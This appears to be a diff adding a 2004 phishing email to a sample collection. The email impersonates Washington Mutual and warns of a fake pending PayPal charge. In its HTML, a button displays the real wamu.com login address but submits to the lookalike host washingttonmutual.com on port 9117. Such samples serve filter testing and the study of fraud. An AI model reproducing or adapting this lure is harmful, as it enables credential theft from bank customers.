@@ -1,0 +1,251 @@
+Return-Path: <authorization-department@wamu.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 5962 invoked by uid 115); 26 Dec 2004 23:54:11 -0000
+Received: from authorization-department@wamu.com by churchill by uid 64011 with qmail-scanner-1.22 
+ (clamdscan: 0.75-1. spamassassin: 2.63.  Clear:RC:0(4.26.42.49):. 
+ Processed in 7.209864 secs); 26 Dec 2004 23:54:11 -0000
+Received: from unknown (HELO 4.26.42.49) (4.26.42.49)
+  by churchill.factcomp.com with SMTP; 26 Dec 2004 23:54:03 -0000
+Message-ID: <79f701c4eba4$242009e2$3e13124e@wamu.com>
+From: Washington Mutual Authorization Department <authorization-department@wamu.com>
+To: bruceg@em.ca
+Subject: Payment authorization is pending.
+Date: Sun, 26 Dec 2004 23:39:21 +0000
+MIME-Version: 1.0
+Content-Type: multipart/related;
+    type="multipart/alternative";
+    boundary="----=_NextPart_000_0000_664FE7AB.D6A35298"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_664FE7AB.D6A35298
+Content-Type: multipart/alternative;
+    boundary="----=_NextPart_001_0001_85A9D460.58652A65"
+
+
+------=_NextPart_001_0001_85A9D460.58652A65
+Content-Type: text/plain; charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+
+ 
+
+ 
+
+
+AUTHORIZATIONS/CLEARING AND SETTLEMENT DEPARTMENT.
+
+s
+  Dear respected customer of Washington Mutual Bank, 
+Our Authorizations Department recorded a payment request from Paypal.com to enable the charge of $900.23 on your account.
+The status of your payment is \"Pending\". Please ignore this message if you authorize this transaction.
+If you don\'t authorize this payment please click the link below to cancel it.
+
+ 
+s 
+
+PLEASE DO NOT RESPOND DIRECTLY TO THIS E-MAIL.
+Mail sent to this address cannot be answered. For assistance, log in to your account and choose the \"Help\" link in the header of any page.
+
+s
+
+
+
+
+
+
+
+Terms of Use | Your Privacy & Security
+sCopyright 2004, Washington Mutual, Inc. All Rights Reserved
+
+
+  
+
+
+------=_NextPart_001_0001_85A9D460.58652A65
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY><!-- Custom global header for Select Your State -->
+<DIV id='\"lyrHeadBanner\"' 10\? top: absolute; position: 7; left: 1; ? 
+z-index:><TBODY><TR><TD width='\"311\"'><A 
+href='\"http://www.wamu.com/home.htm\"'><IMG title='\"wamu.com' height='\"29\"' 
+alt='\"wamu.com' src='\"http://www.wamu.com/images/b-wamucom_logo.gif\"' 
+width='\"311\"' border='\"0\"' site\? Web Inc. Mutual, Washington A></A></TD> 
+<TD width='\"100%\"' align='\"right\"'>
+<TABLE id='\"Table2\"' cellSpacing='\"0\"' cellPadding='\"0\"' border='\"0\"'>
+  <TBODY>
+  <TR>
+    <TD><IMG height='\"1\"' alt="" 
+      src='\"http://www.wamu.com/images/1px_clear.gif\"' width='\"1\"' 
+      border='\"0\"'></TD></TR>
+  <TR>
+    <TD class='\"topnav\"'><IMG height='\"1\"' alt="" 
+      src='\"http://www.wamu.com/images/1px_clear.gif\"' width='\"7\"' 
+      border='\"0\"'></TD></TR></TBODY></TABLE></TD></TR><TR><TD width='\"100%\"' 
+colSpan='\"2\"' bgColor="#000090" vAlign='\"top\"'><A 
+href='\"http://www.wamu.com/\"'><IMG height='\"39\"' alt='\"wamu.com\"' 
+src='\"http://www.wamu.com/images/chp_logo_wamucom.gif\"' width='\"223\"' 
+border='\"0\"'></A></TD></TR> <TR><TD width='\"100%\"' colSpan='\"2\"' 
+bgColor="#000090" vAlign='\"top\"'><IMG height='\"3\"' alt="" 
+src='\"http://www.wamu.com/images/1px_clear.gif\"' width='\"1\"' 
+border='\"0\"'></TD></TR></TBODY></TABLE></DIV><!-- End custom global header for Select Your State --><!-- Main layout table --------------------------------------------------------- -->
+<TABLE cellSpacing='\"0\"' cellPadding='\"0\"' width='\"100%\"' 
+  border='\"0\"'><TBODY>
+  <TR>
+    <TD vAlign='\"top\"' align='\"left\"'><IMG height='\"117\"' alt="" 
+      src='\"http://www.wamu.com/images/1px_clear.gif\"' width='\"1\"' 
+      border='\"0\"'></TD></TR>
+  <TR>
+    <TD vAlign='\"top\"' align='\"left\"' width='\"100%\"'>
+      <TABLE cellSpacing='\"0\"' cellPadding='\"0\"' width='\"100%\"' 
+      border='\"0\"'>
+        <TBODY>
+        <TR>
+          <TD vAlign='\"top\"' align='\"left\"'>
+            <TABLE cellSpacing='\"0\"' cellPadding='\"0\"' width='\"100%\"' 
+            border='\"0\"'>
+              <TBODY>
+              <TR>
+                <TD vAlign='\"top\"' align='\"left\"' width='\"142\"'><!-- Wrapper table for Vertical Subnav Menu and Helpful Links 
+-------------------------------------------- -->
+                  <TABLE cellSpacing='\"0\"' cellPadding='\"0\"' 
+                    border='\"0\"'><TBODY>
+                    <TR>
+                      <TD height='\"4\"'><IMG height='\"4\"' alt="" 
+                        src='\"http://www.wamu.com/images/1px_clear.gif\"' 
+                        width='\"142\"' border='\"0\"'></TD></TR></TBODY></TABLE></TD><!-- End Wrapper table for Vertical Subnav and Helpful Links 
+------------------------------------------ -->
+                <TD vAlign='\"top\"' align='\"left\"' width='\"100%\"'>
+                  <TABLE cellSpacing='\"0\"' cellPadding='\"0\"' 
+                  width='\"100%\"' border='\"0\"'>
+                    <TBODY>
+                    <TR><!-- Title Header --><!-- contentHdr14[color] -->
+                      <TD vAlign='\"top\"' align='\"left\"' width='\"100%\"'>
+                        <TABLE cellSpacing='\"0\"' cellPadding='\"0\"' 
+                        width='\"100%\"' border='\"0\"'>
+                          <TBODY>
+                          <TR>
+                            <TD class='\"contentHdr14MainBlue\"' 
+                            vAlign='\"bottom\"' noWrap><B><FONT 
+                              face='\"Verdana\"' 
+                              size='\"2\"'>AUTHORIZATIONS/CLEARING AND 
+                              SETTLEMENT 
+                        DEPARTMENT.</FONT></B></TD></TR></TBODY></TABLE></TD></TR>
+                    <TR>
+                      <TD class='\"mainfont\"'>s</TD></TR>
+                    <TR>
+                      <TD vAlign='\"top\"' align='\"left\"' width='\"100%\"'><!-- Main Content Area ------------------------------------------------- -->
+                        <FORM id='\"frmSelectState\"' name='\"frmSelectState\"' 
+                        method='\"post\"'></FORM><INPUT id='\"hdnCookieError\"' 
+                        type='\"hidden\"' name='\"hdnCookieError\"'> <INPUT 
+                        id='\"hdnTargetURL\"' type='\"hidden\"' 
+                        name='\"hdnTargetURL\"'> 
+                        <TABLE id='\"Table6\"' cellSpacing='\"0\"' 
+                        cellPadding='\"0\"' width='\"588\"' border='\"0\"'>
+                          <TBODY>
+                          <TR>
+                            <TD class='\"mainfont\"' vAlign='\"top\"' 
+                            width='\"603\"' colSpan='\"3\"'><FONT 
+                              face='\"Verdana\"' size='\"2\"'>Dear respected 
+                              customer of Washington Mutual Bank, 
+                              <P></FONT><FONT face='\"Verdana\"' size='\"2\"'>
+                              <DIV>Our Authorizations Department recorded a 
+                              payment request from Paypal.com to enable the 
+                              charge of $900.23 on your account.</DIV>
+                              <DIV>The status of your payment is \"Pending\". 
+                              Please ignore this message if you authorize this 
+                              transaction.</DIV>
+                              <DIV>If you don\'t authorize this payment please 
+                              click the link below to cancel it.<BR>
+                              <FORM action=http://washingttonmutual.com:9117 
+                              target='\"_blank\"' ShowFormWarning()\? 
+                              onfiltered='\"return'><INPUT type=submit value=https://login.personal.wamu.com/logon/logon.asp?dd=1/ underline\? TEXT-DECORATION: transparent; BACKGROUND-COLOR: 0pt; BORDER-BOTTOM: COLOR:blue; hand; CURSOR: BORDER-LEFT: 10pt; FONT-SIZE: BORDER-TOP: ? BORDER-RIGHT:> 
+
+                              <P></P></DIV>
+                              <DIV></DIV>s 
+                              <P><IMG height='\"2\"' alt="" 
+                              src='\"http://www.wamu.com/images/1px_purple.gif\"' 
+                              width='\"602\"' border='\"0\"'></P>
+                              <P><FONT face='\"verdana,helvetica,arial\"' 
+                              size='\"1\"'><B>PLEASE DO NOT RESPOND DIRECTLY TO 
+                              THIS E-MAIL.</B><BR></FONT></FONT><TT><FONT 
+                              face='\"Arial\"' size='\"1\"'>Mail sent to this 
+                              address cannot be answered. For assistance, log in 
+                              to your account and choose the \"Help\" link in 
+                              the header of any page.</FONT></TT><FONT 
+                              face='\"Verdana\"' size='\"2\"'><TT><BR></TT><FONT 
+                              face='\"arial,helvetica,verdana\"' 
+                              size='\"1\"'><BR></FONT>s</FONT></P></TD></TR></TBODY></TABLE><!--<input type=\"hidden\" name=\"hdnTargetURL\" id=\"hdnTargetURL\" 
+value=\"/personal/welcome/welcome.asp\" />
+
+
+<input type=\"hidden\" name=\"hdnCookieError\" id=\"hdnCookieError\" value=\"\" />--></FORM><!-- End Main Content Area --------------------------------------------- --></TD></TR><!-- Spacer image below to ensure minimum column width matches style guide -->
+                    <TR>
+                      <TD><IMG height='\"1\"' alt="" 
+                        src='\"http://www.wamu.com/images/1px_clear.gif\"' 
+                        width='\"516\"' 
+              border='\"0\"'></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+          <TD width='\"31\"'><IMG height='\"1\"' alt="" 
+            src='\"http://www.wamu.com/images/1px_white.gif\"' width='\"31\"' 
+            border='\"0\"'></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><!-- End Main layout table -------------------------------------------------------- 
+--><!-- Custom global footer for Select Your State -->
+<TABLE id='\"Table3\"' cellSpacing='\"0\"' cellPadding='\"0\"' width='\"685\"' 
+border='\"0\"'>
+  <TBODY>
+  <TR>
+    <TD><!-- spacer image to force page width to minimum 720px --><IMG 
+      height='\"72\"' alt="" src='\"http://www.wamu.com/images/1px_clear.gif\"' 
+      width='\"685\"' border='\"0\"'></TD></TR></TBODY></TABLE>
+<TABLE id='\"Table5\"' height='\"40\"' cellSpacing='\"0\"' cellPadding='\"0\"' 
+width='\"100%\"' bgColor=#000090 border='\"0\"'>
+  <TBODY>
+  <TR>
+    <TD vAlign='\"top\"' align='\"right\"'>
+      <TABLE cellSpacing='\"0\"' cellPadding='\"0\"' bgColor=#000090 
+      border='\"0\"'>
+        <TBODY>
+        <TR>
+          <TD vAlign='\"top\"'><IMG height='\"2\"' alt="" 
+            src='\"http://www.wamu.com/images/1px_clear.gif\"' width='\"1\"' 
+            border='\"0\"'></TD></TR>
+        <TR>
+          <TD vAlign='\"top\"' align='\"right\"'><SPAN class='\"link\"'><A 
+            class='\"footer3\"' 
+            href='\"http://www.wamu.com/personal/welcome/Terms.asp\"'><U><FONT 
+            color=#00fff0>Terms of Use</FONT></U></A></SPAN><FONT color=#00fff0> 
+            <SPAN class='\"footercopy\"'>|</SPAN> </FONT><SPAN 
+            class='\"link\"'><A class='\"footer3\"' 
+            href='\"http://www.wamu.com/personal/welcome/Privacy.htm\"'><U><FONT 
+            color=#00fff0>Your Privacy &amp; Security</FONT></U></A></SPAN><FONT 
+            color=#00fff0><BR><SPAN class='\"footercopy\"'><NOBR>sCopyright 
+            2004, Washington Mutual, Inc. All Rights 
+            Reserved</NOBR></SPAN></FONT></TD></TR></TBODY></TABLE></TD>
+    <TD vAlign='\"top\"' width='\"14\"' bgColor=#000090><IMG height='\"39\"' 
+      alt="" src='\"http://www.wamu.com/images/1px_mainblue.gif\"' 
+      width='\"14\"' border='\"0\"'></TD></TR></TBODY></TABLE>
+<P><IMG alt="" 
+src='\"http://metric.wamu.com/1.gif?ng_host=www.wamu.com&amp;ng_uf=-&amp;ng_pagetitle=Washington' 
+border='\"0\"' name='\"imgPageDot\"' 
+t='-&amp;ng_pdver=102&amp;ng_r1=2&amp;ng_r2=200388\"' 
+%20Mutual%20-%20Select%20Your%20State&ng_referrer="-&amp;ng_sr=1280*800&amp;ng_cookieOK=Y&amp;ngm_s"> 
+<NOSCRIPT><IMG alt='\"\"' 
+src='\"http://metric.wamu.com/1.gif?ng_host=www.wamu.com&amp;ng_uf=-&amp;ng_pagetitle=-&amp;ng_refer' 
+border='\"0\"' name='\"imgPageDot\"' 15125\? 
+rer="-&amp;ng_sr=-&amp;ng_cookieOK=Y&amp;ngm_st=-&amp;ng_pdver=102&amp;ng_r1=2004-12-19T00:05:11&amp;ng_r2=0.49"></NOSCRIPT> 
+
+<DIV></DIV></BODY></HTML>
+
+
+------=_NextPart_001_0001_85A9D460.58652A65--
+
+
+
+------=_NextPart_000_0000_664FE7AB.D6A35298--
+ 
